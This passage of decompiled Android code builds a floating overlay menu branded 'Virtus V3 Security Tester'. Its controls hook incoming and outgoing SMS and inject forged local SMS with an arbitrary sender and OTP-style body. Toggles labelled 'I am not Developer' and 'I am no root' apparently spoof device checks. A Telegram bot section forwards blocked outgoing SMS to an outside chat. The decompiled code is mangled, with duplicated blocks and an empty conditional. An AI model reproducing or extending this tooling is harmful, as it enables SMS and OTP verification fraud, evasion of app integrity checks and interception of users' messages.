                            LinearLayout.LayoutParams layoutParams19b = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams19b.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                            r1mock.setLayoutParams(layoutParams19b);
                            linearLayout3.addView(r1mock);
                            final Switch r3 = new Switch(this.val$activity);
                            r3.setText("I am not Developer");
                            r3.setTextColor(-1);
                            r3.setTextSize(2, 13.0f);
                            LinearLayout.LayoutParams layoutParams20 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams20.topMargin = FloatingMenu.dpToPx(this.val$activity, 14.0f);
                            r3.setLayoutParams(layoutParams20);
                            linearLayout3.addView(r3);
                            final Switch r2 = new Switch(this.val$activity);
                            r2.setText("I am no root");
                            r2.setTextColor(-1);
                            r2.setTextSize(2, 13.0f);
                            LinearLayout.LayoutParams layoutParams21 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams21.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                            r2.setLayoutParams(layoutParams21);
                            linearLayout3.addView(r2);
                            r5.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() { // from class: com.floatingmenu.FloatingMenu.1.1
                                @Override // android.widget.CompoundButton.OnCheckedChangeListener
                                public void onCheckedChanged(CompoundButton compoundButton, boolean z) {
                                    linearLayout6.setVisibility(z ? 0 : 8);
                                }
                            });
                            r12.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() { // from class: com.floatingmenu.FloatingMenu.1.2
                                @Override // android.widget.CompoundButton.OnCheckedChangeListener
                                public void onCheckedChanged(CompoundButton compoundButton, boolean z) {
                                    linearLayout7.setVisibility(z ? 0 : 8);
                                }
                            });
                            Button button4 = new Button(this.val$activity);
                            button4.setText("Save SIM Settings");
                            button4.setTextColor(-1);
                            button4.setTextSize(2, 12.0f);
                            button4.setAllCaps(false);
                            GradientDrawable gradientDrawable4 = new GradientDrawable();
                            gradientDrawable4.setShape(0);
                            gradientDrawable4.setColor(-2937041);
                            gradientDrawable4.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 8.0f));
                            button4.setBackground(gradientDrawable4);
                            LinearLayout.LayoutParams layoutParams22 = new LinearLayout.LayoutParams(-1, FloatingMenu.dpToPx(this.val$activity, 38.0f));
                            layoutParams22.topMargin = FloatingMenu.dpToPx(this.val$activity, 16.0f);
                            button4.setLayoutParams(layoutParams22);
                            button4.setOnClickListener(new AnonymousClass3(r5, strArr, editText, r12, strArr2, editText2, editText3, r3, r2, r1mock));
                            linearLayout3.addView(button4);
                            str = FloatingMenu.TAG_MENU;
                            new Thread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.4
                                @Override // java.lang.Runnable
                                public void run() {
                                    final String[] loadSimSettingsEx = FloatingMenu.loadSimSettingsEx();
                                    AnonymousClass1.this.val$activity.runOnUiThread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.4.1
                                        @Override // java.lang.Runnable
                                        public void run() {
                                            boolean equalsIgnoreCase = "true".equalsIgnoreCase(loadSimSettingsEx[0]);
                                            String[] strArr3 = loadSimSettingsEx;
                                            String str2 = strArr3[1];
                                            String str3 = strArr3[2];
                                            boolean equalsIgnoreCase2 = "true".equalsIgnoreCase(strArr3[3]);
                                            String[] strArr4 = loadSimSettingsEx;
                                            String str4 = strArr4[4];
                                            String str5 = strArr4[5];
                                            String str6 = "in";
                                            String str7 = strArr4.length >= 7 ? strArr4[6] : "in";
                                            if (str7 != null && !str7.isEmpty()) {
                                                str6 = str7;
                                            }
                                            r5.setChecked(equalsIgnoreCase);
                                            linearLayout6.setVisibility(equalsIgnoreCase ? 0 : 8);
                                            AnonymousClass4 anonymousClass4 = AnonymousClass4.this;
                                            strArr[0] = str2;
                                            FloatingMenu.updateSelector(createProviderSelector, str2);
                                            editText.setText(str3);
                                            r12.setChecked(equalsIgnoreCase2);
                                            linearLayout7.setVisibility(equalsIgnoreCase2 ? 0 : 8);
                                            AnonymousClass4 anonymousClass42 = AnonymousClass4.this;
                                            strArr2[0] = str4;
                                            FloatingMenu.updateSelector(createProviderSelector2, str4);
                                            editText2.setText(str5);
                                            editText3.setText(str6);
                                            String[] strArr5 = loadSimSettingsEx;
                                            r3.setChecked(strArr5.length >= 8 ? "true".equalsIgnoreCase(strArr5[7]) : false);
                                            String[] strArr6 = loadSimSettingsEx;
                                            r2.setChecked(strArr6.length >= 9 ? "true".equalsIgnoreCase(strArr6[8]) : false);
                                            String[] strArr7 = loadSimSettingsEx;
                                            r1mock.setChecked(strArr7.length >= 10 ? "true".equalsIgnoreCase(strArr7[9]) : false);
                                        }
                                    });
                                }
                            }).start();
                            Switch r9 = new Switch(this.val$activity);
                            r9.setText("Hook Incoming SMS");
                            r9.setTextColor(-1);
                            r9.setTextSize(2, 13.0f);
                            LinearLayout.LayoutParams layoutParams23 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams23.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                            r9.setLayoutParams(layoutParams23);
                            r9.setChecked(FloatingMenu.sHookIncoming);
                            linearLayout4.addView(r9);
                            Switch r15 = new Switch(this.val$activity);
                            r15.setText("Hook Outgoing SMS");
                            r15.setTextColor(-1);
                            r15.setTextSize(2, 13.0f);
                            LinearLayout.LayoutParams layoutParams24 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams24.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                            r15.setLayoutParams(layoutParams24);
                            r15.setChecked(FloatingMenu.sHookOutgoing);
                            linearLayout4.addView(r15);
                            final View view3 = new View(this.val$activity);
                            LinearLayout.LayoutParams layoutParams25 = new LinearLayout.LayoutParams(-1, FloatingMenu.dpToPx(this.val$activity, 1.0f));
                            layoutParams25.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                            layoutParams25.bottomMargin = FloatingMenu.dpToPx(this.val$activity, 6.0f);
                            view3.setLayoutParams(layoutParams25);
                            view3.setBackgroundColor(-3924422);
                            linearLayout4.addView(view3);
                            final TextView textView9 = new TextView(this.val$activity);
                            textView9.setText("Sender ID:");
                            textView9.setTextColor(-328454);
                            textView9.setTextSize(2, 11.0f);
                            LinearLayout.LayoutParams layoutParams26 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams26.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                            textView9.setLayoutParams(layoutParams26);
                            linearLayout4.addView(textView9);
                            final EditText editText4 = new EditText(this.val$activity);
                            editText4.setText(FloatingMenu.sSenderText);
                            editText4.setTextColor(-1);
                            editText4.setTextSize(2, 13.0f);
                            editText4.setHint("e.g. AD-TEST-S");
                            editText4.setHintTextColor(-8947848);
                            GradientDrawable gradientDrawable5 = new GradientDrawable();
                            gradientDrawable5.setShape(0);
                            gradientDrawable5.setColor(-6684672);
                            gradientDrawable5.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 6.0f));
                            editText4.setBackground(gradientDrawable5);
                            editText4.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f));
                            LinearLayout.LayoutParams layoutParams27 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams27.topMargin = FloatingMenu.dpToPx(this.val$activity, 4.0f);
                            editText4.setLayoutParams(layoutParams27);
                            editText4.addTextChangedListener(new TextWatcher() { // from class: com.floatingmenu.FloatingMenu.1.5
                                @Override // android.text.TextWatcher
                                public void afterTextChanged(Editable editable) {
                                    String unused2 = FloatingMenu.sSenderText = editable.toString();
                                }

                                @Override // android.text.TextWatcher
                                public void beforeTextChanged(CharSequence charSequence, int i, int i2, int i3) {
                                }

                                @Override // android.text.TextWatcher
                                public void onTextChanged(CharSequence charSequence, int i, int i2, int i3) {
                                }
                            });
                            linearLayout4.addView(editText4);
                            final TextView textView10 = new TextView(this.val$activity);
                            textView10.setText("Message Body:");
                            textView10.setTextColor(-328454);
                            textView10.setTextSize(2, 11.0f);
                            LinearLayout.LayoutParams layoutParams28 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams28.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                            textView10.setLayoutParams(layoutParams28);
                            linearLayout4.addView(textView10);
                            final EditText editText5 = new EditText(this.val$activity);
                            editText5.setHint("Type your message body (e.g. Your verification OTP code is 918204)");
                            editText5.setText(FloatingMenu.sBodyText);
                            editText5.setTextColor(-1);
                            editText5.setTextSize(2, 12.0f);
                            editText5.setHintTextColor(-8947848);
                            editText5.setBackground(gradientDrawable5);
                            editText5.setSingleLine(false);
                            editText5.setLines(3);
                            editText5.setGravity(51);
                            editText5.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f));
                            LinearLayout.LayoutParams layoutParams29 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams29.topMargin = FloatingMenu.dpToPx(this.val$activity, 4.0f);
                            editText5.setLayoutParams(layoutParams29);
                            editText5.addTextChangedListener(new TextWatcher() { // from class: com.floatingmenu.FloatingMenu.1.6
                                @Override // android.text.TextWatcher
                                public void afterTextChanged(Editable editable) {
                                    String unused2 = FloatingMenu.sBodyText = editable.toString();
                                }

                                @Override // android.text.TextWatcher
                                public void beforeTextChanged(CharSequence charSequence, int i, int i2, int i3) {
                                }

                                @Override // android.text.TextWatcher
                                public void onTextChanged(CharSequence charSequence, int i, int i2, int i3) {
                                }
                            });
                            linearLayout4.addView(editText5);
                            final Button button5 = new Button(this.val$activity);
                            button5.setText("Inject Local SMS");
                            button5.setTextColor(-1);
                            button5.setTextSize(2, 12.0f);
                            button5.setAllCaps(false);
                            GradientDrawable gradientDrawable6 = new GradientDrawable();
                            gradientDrawable6.setShape(0);
                            gradientDrawable6.setColor(-2937041);
                            gradientDrawable6.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 8.0f));
                            button5.setBackground(gradientDrawable6);
                            LinearLayout.LayoutParams layoutParams30 = new LinearLayout.LayoutParams(-1, FloatingMenu.dpToPx(this.val$activity, 38.0f));
                            layoutParams30.topMargin = FloatingMenu.dpToPx(this.val$activity, 14.0f);
                            button5.setLayoutParams(layoutParams30);
                            button5.setOnClickListener(new View.OnClickListener() { // from class: com.floatingmenu.FloatingMenu.1.7
                                @Override // android.view.View.OnClickListener
                                public void onClick(View view4) {
                                    String trim = editText4.getText().toString().trim();
                                    String trim2 = editText5.getText().toString().trim();
                                    if (trim.isEmpty() || trim2.isEmpty()) {
                                        FloatingMenu.showToast(AnonymousClass1.this.val$activity, "Please fill both Sender ID and Message Body.");
                                    } else {
                                        FloatingMenu.triggerLocalSmsBroadcast(AnonymousClass1.this.val$activity, trim, trim2);
                                    }
                                }
                            });
                            linearLayout4.addView(button5);
                            int i = !FloatingMenu.sHookIncoming ? 0 : 8;
                            view3.setVisibility(i);
                            textView9.setVisibility(i);
                            editText4.setVisibility(i);
                            textView10.setVisibility(i);
                            editText5.setVisibility(i);
                            button5.setVisibility(i);
                            r9.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() { // from class: com.floatingmenu.FloatingMenu.1.8
                                @Override // android.widget.CompoundButton.OnCheckedChangeListener
                                public void onCheckedChanged(CompoundButton compoundButton, boolean z) {
                                    FloatingMenu.sHookIncoming = z;
                                    int i2 = z ? 0 : 8;
                                    view3.setVisibility(i2);
                                    textView9.setVisibility(i2);
                                    editText4.setVisibility(i2);
                                    textView10.setVisibility(i2);
                                    editText5.setVisibility(i2);
                                    button5.setVisibility(i2);
                                    FloatingMenu.showToast(AnonymousClass1.this.val$activity, "Hook Incoming SMS: ".concat(z ? "ON" : "OFF"));
                                }
                            });
                            r15.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() { // from class: com.floatingmenu.FloatingMenu.1.9
                                @Override // android.widget.CompoundButton.OnCheckedChangeListener
                                public void onCheckedChanged(CompoundButton compoundButton, boolean z) {
                                    FloatingMenu.sHookOutgoing = z;
                                    FloatingMenu.showToast(AnonymousClass1.this.val$activity, "Hook Outgoing SMS: ".concat(z ? "ON" : "OFF"));
                                }
                            });
                            TextView textView11 = new TextView(this.val$activity);
                            textView11.setText("Configure Telegram bot credentials to forward blocked outgoing SMS automatically.");
                            textView11.setTextColor(-328454);
                            textView11.setTextSize(2, 12.0f);
                            LinearLayout.LayoutParams layoutParams31 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams31.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                            textView11.setLayoutParams(layoutParams31);
                            linearLayout5.addView(textView11);
                            TextView textView12 = new TextView(this.val$activity);
                            textView12.setText("Telegram Bot Token:");
                            textView12.setTextColor(-328454);
                            textView12.setTextSize(2, 11.0f);
                            LinearLayout.LayoutParams layoutParams32 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams32.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                            textView12.setLayoutParams(layoutParams32);
                            linearLayout5.addView(textView12);
                            final EditText editText6 = new EditText(this.val$activity);
                            editText6.setHint("e.g. 123456789:ABCdefGhI...");
                            editText6.setTextColor(-1);
                            editText6.setTextSize(2, 12.0f);
                            editText6.setHintTextColor(-8947848);
                            editText6.setBackground(gradientDrawable5);
                            editText6.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f));
                            LinearLayout.LayoutParams layoutParams33 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams33.topMargin = FloatingMenu.dpToPx(this.val$activity, 4.0f);
                            editText6.setLayoutParams(layoutParams33);
                            linearLayout5.addView(editText6);
                            TextView textView13 = new TextView(this.val$activity);
                            textView13.setText("Telegram Chat ID:");
                            textView13.setTextColor(-328454);
                            textView13.setTextSize(2, 11.0f);
                            LinearLayout.LayoutParams layoutParams34 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams34.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                            textView13.setLayoutParams(layoutParams34);
                            linearLayout5.addView(textView13);
                            final EditText editText7 = new EditText(this.val$activity);
                            editText7.setHint("e.g. 987654321 or -100123456");
                            editText7.setTextColor(-1);
                            editText7.setTextSize(2, 12.0f);
                            editText7.setHintTextColor(-8947848);
                            editText7.setBackground(gradientDrawable5);
                            editText7.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f));
                            editText7.setLayoutParams(layoutParams33);
                            linearLayout5.addView(editText7);
                            new Thread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.10
                                @Override // java.lang.Runnable
                                public void run() {
                                    final String[] loadTelegramConfig = FloatingMenu.loadTelegramConfig();
                                    AnonymousClass1.this.val$activity.runOnUiThread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.10.1
                                        @Override // java.lang.Runnable
                                        public void run() {
                                            editText6.setText(loadTelegramConfig[0]);
                                            editText7.setText(loadTelegramConfig[1]);
                                        }
                                    });
                                }
                            }).start();
                            Button button6 = new Button(this.val$activity);
                            button6.setText("Verify & Submit");
                            button6.setTextColor(-1);
                            button6.setTextSize(2, 12.0f);
                            button6.setAllCaps(false);
                            GradientDrawable gradientDrawable7 = new GradientDrawable();
                            gradientDrawable7.setShape(0);
                            gradientDrawable7.setColor(-2937041);
                            gradientDrawable7.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 8.0f));
                            button6.setBackground(gradientDrawable7);
                            LinearLayout.LayoutParams layoutParams35 = new LinearLayout.LayoutParams(-1, FloatingMenu.dpToPx(this.val$activity, 38.0f));
                            layoutParams35.topMargin = FloatingMenu.dpToPx(this.val$activity, 14.0f);
                            button6.setLayoutParams(layoutParams35);
                            button6.setOnClickListener(new AnonymousClass11(editText6, editText7));
                            linearLayout5.addView(button6);
                            final GradientDrawable gradientDrawable8 = new GradientDrawable();
                            gradientDrawable8.setShape(0);
                            gradientDrawable8.setColor(-3924422);
                            gradientDrawable8.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 6.0f));
                            final GradientDrawable gradientDrawable9 = new GradientDrawable();
                            gradientDrawable9.setShape(0);
                            gradientDrawable9.setColor(-6684672);
                            gradientDrawable9.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 6.0f));
                            final Runnable runnable = new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.12
                                @Override // java.lang.Runnable
                                public void run() {
                                    button.setBackground(gradientDrawable9);
                                    button2.setBackground(gradientDrawable8);
                                    button3.setBackground(gradientDrawable9);
                                    linearLayout3.setVisibility(8);
                                    linearLayout4.setVisibility(0);
                                    linearLayout5.setVisibility(8);
                                }
                            };
                            final Runnable runnable2 = new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.13
                                @Override // java.lang.Runnable
                                public void run() {
                                    button.setBackground(gradientDrawable8);
                                    button2.setBackground(gradientDrawable9);
                                    button3.setBackground(gradientDrawable9);
                                    linearLayout3.setVisibility(0);
                                    linearLayout4.setVisibility(8);
                                    linearLayout5.setVisibility(8);
                                }
                            };
                            final Runnable runnable3 = new Runnable() { // from class: com.floatingmenu.FloatingMenu.1.14
                                @Override // java.lang.Runnable
                                public void run() {
                                    button.setBackground(gradientDrawable9);
                                    button2.setBackground(gradientDrawable9);
                                    button3.setBackground(gradientDrawable8);
                                    linearLayout3.setVisibility(8);
                                    linearLayout4.setVisibility(8);
                                    linearLayout5.setVisibility(0);
                                }
                            };
                            button.setOnClickListener(new View.OnClickListener() { // from class: com.floatingmenu.FloatingMenu.1.15
                                @Override // android.view.View.OnClickListener
                                public void onClick(View view4) {
                                    runnable2.run();
                                }
                            });
                            button2.setOnClickListener(new View.OnClickListener() { // from class: com.floatingmenu.FloatingMenu.1.16
                                @Override // android.view.View.OnClickListener
                                public void onClick(View view4) {
                                    runnable.run();
                                }
                            });
                            button3.setOnClickListener(new View.OnClickListener() { // from class: com.floatingmenu.FloatingMenu.1.17
                                @Override // android.view.View.OnClickListener
                                public void onClick(View view4) {
                                    runnable3.run();
                                }
                            });
                            runnable.run();
                            TextView textView14 = new TextView(this.val$activity);
                            textView14.setText("Virtus V3 Security Tester");
                            textView14.setTextColor(-6723994);
                            textView14.setTextSize(2, 10.0f);
                            textView14.setGravity(17);
                            LinearLayout.LayoutParams layoutParams36 = new LinearLayout.LayoutParams(-1, -2);
                            layoutParams36.topMargin = FloatingMenu.dpToPx(this.val$activity, 16.0f);
                            textView14.setLayoutParams(layoutParams36);
                            linearLayout.addView(textView14);
                            frameLayout.addView(frameLayout2);
                            frameLayout.addView(linearLayout);
                            viewGroup.addView(frameLayout);
                            frameLayout2.setOnTouchListener(new View.OnTouchListener() { // from class: com.floatingmenu.FloatingMenu.1.18
                                private static final int CLICK_DRAG_TOLERANCE = 10;
                                private float initialTouchX;
                                private float initialTouchY;
                                private float initialX;
                                private float initialY;
                                private long touchTime;

                                @Override // android.view.View.OnTouchListener
                                public boolean onTouch(View view4, MotionEvent motionEvent) {
                                    float x;
                                    float y;
                                    int action = motionEvent.getAction();
                                    if (action == 0) {
                                        x = frameLayout2.getX();
                                        this.initialX = x;
                                        y = frameLayout2.getY();
                                        this.initialY = y;
                                        this.initialTouchX = motionEvent.getRawX();
                                        this.initialTouchY = motionEvent.getRawY();
                                        this.touchTime = System.currentTimeMillis();
                                        return true;
                                    }
                                    if (action != 1) {
                                        if (action != 2) {
                                            return false;
                                        }
                                        float rawX = motionEvent.getRawX() - this.initialTouchX;
                                        float rawY = motionEvent.getRawY() - this.initialTouchY;
                                        frameLayout2.setX(this.initialX + rawX);
                                        frameLayout2.setY(this.initialY + rawY);
                                        return true;
                                    }
                                    float rawX2 = motionEvent.getRawX() - this.initialTouchX;
                                    float rawY2 = motionEvent.getRawY() - this.initialTouchY;
                                    long currentTimeMillis = System.currentTimeMillis() - this.touchTime;
                                    if (Math.abs(rawX2) < 10.0f && Math.abs(rawY2) < 10.0f && currentTimeMillis < 400) {
                                        frameLayout2.setVisibility(8);
                                        linearLayout.setVisibility(0);
                                    }
                                    return true;
                                }
                            });
                            textView2.setOnClickListener(new View.OnClickListener() { // from class: com.floatingmenu.FloatingMenu.1.19
                                @Override // android.view.View.OnClickListener
                                public void onClick(View view4) {
                                    linearLayout.setVisibility(8);
                                    frameLayout2.setVisibility(0);
                                }
                            });
                            return;
                        }
                        Switch r92 = new Switch(this.val$activity);
                        r92.setText("Hook Incoming SMS");
                        r92.setTextColor(-1);
                        r92.setTextSize(2, 13.0f);
                        LinearLayout.LayoutParams layoutParams232 = new LinearLayout.LayoutParams(-1, -2);
                        layoutParams232.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                        r92.setLayoutParams(layoutParams232);
                        r92.setChecked(FloatingMenu.sHookIncoming);
                        linearLayout4.addView(r92);
                        Switch r152 = new Switch(this.val$activity);
                        r152.setText("Hook Outgoing SMS");
                        r152.setTextColor(-1);
                        r152.setTextSize(2, 13.0f);
                        LinearLayout.LayoutParams layoutParams242 = new LinearLayout.LayoutParams(-1, -2);
                        layoutParams242.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                        r152.setLayoutParams(layoutParams242);
                        r152.setChecked(FloatingMenu.sHookOutgoing);
                        linearLayout4.addView(r152);
                        final View view32 = new View(this.val$activity);
                        LinearLayout.LayoutParams layoutParams252 = new LinearLayout.LayoutParams(-1, FloatingMenu.dpToPx(this.val$activity, 1.0f));
                        layoutParams252.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                        layoutParams252.bottomMargin = FloatingMenu.dpToPx(this.val$activity, 6.0f);
                        view32.setLayoutParams(layoutParams252);
                        view32.setBackgroundColor(-3924422);
                        linearLayout4.addView(view32);
                        final TextView textView92 = new TextView(this.val$activity);
                        textView92.setText("Sender ID:");
                        textView92.setTextColor(-328454);
                        textView92.setTextSize(2, 11.0f);
                        LinearLayout.LayoutParams layoutParams262 = new LinearLayout.LayoutParams(-1, -2);
                        layoutParams262.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                        textView92.setLayoutParams(layoutParams262);
                        linearLayout4.addView(textView92);
                        final EditText editText42 = new EditText(this.val$activity);
                        editText42.setText(FloatingMenu.sSenderText);
                        editText42.setTextColor(-1);
                        editText42.setTextSize(2, 13.0f);
                        editText42.setHint("e.g. AD-TEST-S");
                        editText42.setHintTextColor(-8947848);
                        GradientDrawable gradientDrawable52 = new GradientDrawable();
                        gradientDrawable52.setShape(0);
                        gradientDrawable52.setColor(-6684672);
                        gradientDrawable52.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 6.0f));
                        editText42.setBackground(gradientDrawable52);
                        editText42.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 6.0f));
                        LinearLayout.LayoutParams layoutParams272 = new LinearLayout.LayoutParams(-1, -2);
                        layoutParams272.topMargin = FloatingMenu.dpToPx(this.val$activity, 4.0f);
                        editText42.setLayoutParams(layoutParams272);
                        editText42.addTextChangedListener(new TextWatcher() { // from class: com.floatingmenu.FloatingMenu.1.5
                            @Override // android.text.TextWatcher
                            public void afterTextChanged(Editable editable) {
                                String unused2 = FloatingMenu.sSenderText = editable.toString();
                            }

                            @Override // android.text.TextWatcher
                            public void beforeTextChanged(CharSequence charSequence, int i2, int i22, int i3) {
                            }

                            @Override // android.text.TextWatcher
                            public void onTextChanged(CharSequence charSequence, int i2, int i22, int i3) {
                            }
                        });
                        linearLayout4.addView(editText42);
                        final TextView textView102 = new TextView(this.val$activity);
                        textView102.setText("Message Body:");
                        textView102.setTextColor(-328454);
                        textView102.setTextSize(2, 11.0f);
                        LinearLayout.LayoutParams layoutParams282 = new LinearLayout.LayoutParams(-1, -2);
                        layoutParams282.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                        textView102.setLayoutParams(layoutParams282);
                        linearLayout4.addView(textView102);
                        final EditText editText52 = new EditText(this.val$activity);
                        editText52.setHint("Type your message body (e.g. Your verification OTP code is 918204)");
                        editText52.setText(FloatingMenu.sBodyText);
                        editText52.setTextColor(-1);
                        editText52.setTextSize(2, 12.0f);
                        editText52.setHintTextColor(-8947848);
                        editText52.setBackground(gradientDrawable52);
                        editText52.setSingleLine(false);
                        editText52.setLines(3);
                        editText52.setGravity(51);
                        editText52.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f));
                        LinearLayout.LayoutParams layoutParams292 = new LinearLayout.LayoutParams(-1, -2);
                        layoutParams292.topMargin = FloatingMenu.dpToPx(this.val$activity, 4.0f);
                        editText52.setLayoutParams(layoutParams292);
                        editText52.addTextChangedListener(new TextWatcher() { // from class: com.floatingmenu.FloatingMenu.1.6
                            @Override // android.text.TextWatcher
                            public void afterTextChanged(Editable editable) {
                                String unused2 = FloatingMenu.sBodyText = editable.toString();
                            }

                            @Override // android.text.TextWatcher
                            public void beforeTextChanged(CharSequence charSequence, int i2, int i22, int i3) {
                            }

                            @Override // android.text.TextWatcher
                            public void onTextChanged(CharSequence charSequence, int i2, int i22, int i3) {
                            }
                        });
                        linearLayout4.addView(editText52);
                        final Button button52 = new Button(this.val$activity);
                        button52.setText("Inject Local SMS");
                        button52.setTextColor(-1);
                        button52.setTextSize(2, 12.0f);
                        button52.setAllCaps(false);
                        GradientDrawable gradientDrawable62 = new GradientDrawable();
                        gradientDrawable62.setShape(0);
                        gradientDrawable62.setColor(-2937041);
                        gradientDrawable62.setCornerRadius(FloatingMenu.dpToPx(this.val$activity, 8.0f));
                        button52.setBackground(gradientDrawable62);
                        LinearLayout.LayoutParams layoutParams302 = new LinearLayout.LayoutParams(-1, FloatingMenu.dpToPx(this.val$activity, 38.0f));
                        layoutParams302.topMargin = FloatingMenu.dpToPx(this.val$activity, 14.0f);
                        button52.setLayoutParams(layoutParams302);
                        button52.setOnClickListener(new View.OnClickListener() { // from class: com.floatingmenu.FloatingMenu.1.7
                            @Override // android.view.View.OnClickListener
                            public void onClick(View view4) {
                                String trim = editText42.getText().toString().trim();
                                String trim2 = editText52.getText().toString().trim();
                                if (trim.isEmpty() || trim2.isEmpty()) {
                                    FloatingMenu.showToast(AnonymousClass1.this.val$activity, "Please fill both Sender ID and Message Body.");
                                } else {
                                    FloatingMenu.triggerLocalSmsBroadcast(AnonymousClass1.this.val$activity, trim, trim2);
                                }
                            }
                        });
                        linearLayout4.addView(button52);
                        if (!FloatingMenu.sHookIncoming) {
                        }
                        view32.setVisibility(i);
                        textView92.setVisibility(i);
                        editText42.setVisibility(i);
                        textView102.setVisibility(i);
                        editText52.setVisibility(i);
                        button52.setVisibility(i);
                        r92.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() { // from class: com.floatingmenu.FloatingMenu.1.8
                            @Override // android.widget.CompoundButton.OnCheckedChangeListener
                            public void onCheckedChanged(CompoundButton compoundButton, boolean z) {
                                FloatingMenu.sHookIncoming = z;
                                int i2 = z ? 0 : 8;
                                view32.setVisibility(i2);
                                textView92.setVisibility(i2);
                                editText42.setVisibility(i2);
                                textView102.setVisibility(i2);
                                editText52.setVisibility(i2);
                                button52.setVisibility(i2);
                                FloatingMenu.showToast(AnonymousClass1.this.val$activity, "Hook Incoming SMS: ".concat(z ? "ON" : "OFF"));
                            }
                        });
                        r152.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() { // from class: com.floatingmenu.FloatingMenu.1.9
                            @Override // android.widget.CompoundButton.OnCheckedChangeListener
                            public void onCheckedChanged(CompoundButton compoundButton, boolean z) {
                                FloatingMenu.sHookOutgoing = z;
                                FloatingMenu.showToast(AnonymousClass1.this.val$activity, "Hook Outgoing SMS: ".concat(z ? "ON" : "OFF"));
                            }
                        });
                        TextView textView112 = new TextView(this.val$activity);
                        textView112.setText("Configure Telegram bot credentials to forward blocked outgoing SMS automatically.");
                        textView112.setTextColor(-328454);
                        textView112.setTextSize(2, 12.0f);
                        LinearLayout.LayoutParams layoutParams312 = new LinearLayout.LayoutParams(-1, -2);
                        layoutParams312.topMargin = FloatingMenu.dpToPx(this.val$activity, 8.0f);
                        textView112.setLayoutParams(layoutParams312);
                        linearLayout5.addView(textView112);
                        TextView textView122 = new TextView(this.val$activity);
                        textView122.setText("Telegram Bot Token:");
                        textView122.setTextColor(-328454);
                        textView122.setTextSize(2, 11.0f);
                        LinearLayout.LayoutParams layoutParams322 = new LinearLayout.LayoutParams(-1, -2);
                        layoutParams322.topMargin = FloatingMenu.dpToPx(this.val$activity, 10.0f);
                        textView122.setLayoutParams(layoutParams322);
                        linearLayout5.addView(textView122);
                        final EditText editText62 = new EditText(this.val$activity);
                        editText62.setHint("e.g. 123456789:ABCdefGhI...");
                        editText62.setTextColor(-1);
                        editText62.setTextSize(2, 12.0f);
                        editText62.setHintTextColor(-8947848);
                        editText62.setBackground(gradientDrawable52);
                        editText62.setPadding(FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f), FloatingMenu.dpToPx(this.val$activity, 8.0f));
                        LinearLayout.LayoutParams layoutParams332 = new LinearLayout.LayoutParams(-1, -2);
